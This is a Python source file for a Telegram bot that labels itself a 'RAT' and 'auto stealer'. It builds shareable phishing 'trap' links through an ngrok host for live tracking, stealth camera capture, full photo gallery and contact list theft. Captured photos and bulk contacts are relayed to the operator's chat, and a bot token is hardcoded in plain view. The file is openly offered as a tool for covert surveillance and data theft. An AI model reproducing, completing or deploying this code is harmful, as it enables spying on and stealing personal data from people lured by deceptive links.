import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import random
import string
import requests
import os
import zipfile
from io import BytesIO

BOT_TOKEN = "8541411839:AAEJzUUN1mDcvgDdTmTlqy5WnveSupmdqpc"
YOUR_WEBHOOK = "https://abc.ngrok.io/upload.php"  # Yahiko server

bot = telebot.TeleBot(BOT_TOKEN)

# Storage for stolen data
stolen_data = {}

@bot.message_handler(commands=['start'])
def welcome_screen(message):
    markup = InlineKeyboardMarkup()
    dashboard_btn = InlineKeyboardButton("👇 Open Dashboard", callback_data="OPEN_DASHBOARD")
    markup.add(dashboard_btn)
    
    bot.send_message(message.chat.id, 
        "✨ *Welcome to Bot*\n\n"
        "*Greetings, YAHIKO.*\n"
        "You have authorized access to the Bot.\n\n"
        "👇 *Open Dashboard:*", 
        parse_mode='Markdown', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    if call.data == "OPEN_DASHBOARD":
        markup = InlineKeyboardMarkup(row_width=1)
        live_btn = InlineKeyboardButton("🔴 LIVE", callback_data="MODULE_LIVE")
        stealth_btn = InlineKeyboardButton("📸 Stealth Camera", callback_data="MODULE_STEALTH")
        gallery_btn = InlineKeyboardButton("🖼️ Gallery (All Photos)", callback_data="MODULE_GALLERY")
        contacts_btn = InlineKeyboardButton("📞 Contacts (All)", callback_data="MODULE_CONTACTS")
        markup.add(live_btn, stealth_btn, gallery_btn, contacts_btn)
        
        bot.edit_message_text(
            "*Welcome YAHIKO*\n"
            "How to use?\n"
            "Start New Capture\n"
            "Select a module below to generate a secure tracking link.\n\n"
            "🔴 *LIVE*\n"
            "📸 *Stealth Camera*\n"
            "🖼️ *Gallery (All Photos)*\n"
            "📞 *Contacts (All)*\n\n"
            "👇 *Generate*", 
            call.message.chat.id, call.message.message_id, 
            parse_mode='Markdown', reply_markup=markup
        )
    
    elif call.data.startswith("MODULE_"):
        module = call.data.split('_')[1]
        trap_id = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        trap_url = f"https://abc.ngrok.io/{module.lower()}?id={trap_id}"
        
        markup = InlineKeyboardMarkup(row_width=2)
        whatsapp_btn = InlineKeyboardButton("📱 WhatsApp", url=f"https://wa.me/?text={trap_url}")
        telegram_btn = InlineKeyboardButton("💬 Telegram", url=f"https://t.me/share/url?url={trap_url}")
        markup.add(whatsapp_btn, telegram_btn)
        
        bot.edit_message_text(
            f"🎯 *TRAP READY*\n\n"
            f"`{trap_url}`\n\n"
            f"📱 *Share anywhere*\n"
            f"🔥 *Auto-steal to Telegram*\n"
            f"💾 *All data direct bot mein*", 
            call.message.chat.id, call.message.message_id,
            parse_mode='Markdown', reply_markup=markup
        )
        
        # Save trap for webhook
        stolen_data[trap_id] = {'chat_id': call.message.chat.id, 'module': module, 'status': 'waiting'}

@bot.message_handler(content_types=['photo', 'document'])
def receive_stolen_data(message):
    """AUTO RECEIVE PHOTOS/CONTACTS"""
    file_id = message.photo[-1].file_id if message.photo else message.document.file_id
    caption = message.caption or "📱 Stolen Data"
    
    # Forward to all active traps
    for trap_id, data in list(stolen_data.items()):
        if data['status'] == 'waiting':
            try:
                bot.send_photo(data['chat_id'], file_id, caption=f"🎯 [{trap_id}] {caption}")
            except:
                pass

@bot.message_handler(func=lambda msg: True)
def receive_contacts(message):
    """Handle text contacts/JSON"""
    text = message.text
    
    if len(text) > 500:  # Bulk contacts
        # Create ZIP for large data
        bio = BytesIO()
        with zipfile.ZipFile(bio, 'w') as zf:
            zf.writestr('contacts.txt', text)
        bio.seek(0)
        
        for trap_id, data in stolen_data.items():
            if data['status'] == 'waiting':
                bot.send_document(data['chat_id'], bio, 
                                caption=f"📞 [{trap_id}] {len(text)} Contacts Stolen!")
        bio.close()
    else:
        # Send as text
        for trap_id, data in stolen_data.items():
            bot.send_message(data['chat_id'], f"📱 [{trap_id}] {text}")

# WEBHOOK ENDPOINT for server
@bot.message_handler(commands=['webhook'])
def webhook_test(message):
    bot.reply_to(message, "✅ Webhook ready for photos/contacts!")

print("🚀 YAHIKO RAT LIVE - AUTO STEALER!")
print("📱 All photos/contacts direct Telegram mein!")
bot.polling(none_stop=True)
